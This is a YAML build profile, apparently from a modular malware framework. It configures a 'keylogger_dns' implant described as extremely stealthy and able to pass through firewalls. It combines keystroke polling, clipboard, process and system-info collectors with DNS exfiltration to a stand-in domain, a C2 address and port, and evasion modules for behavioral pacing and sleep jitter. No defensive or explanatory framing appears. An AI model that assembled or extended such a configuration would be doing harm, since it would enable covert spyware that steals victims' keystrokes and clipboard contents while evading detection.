name: keylogger_dns
description: Keylogger with DNS exfil — extremely stealthy, works through firewalls

core:
  - core/emit_buffer

collectors:
  - collectors/system_info_api
  - collectors/processes
  - collectors/clipboard

keylogger: collectors/keylogger_poll

exfil: exfil/dns_flush
arch: arch/keylogger

resources: true

evasion:
  - evasion/behavioral_pacing
  - evasion/sleep_jitter

vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
  DNS_DOMAIN: "d.example.com"
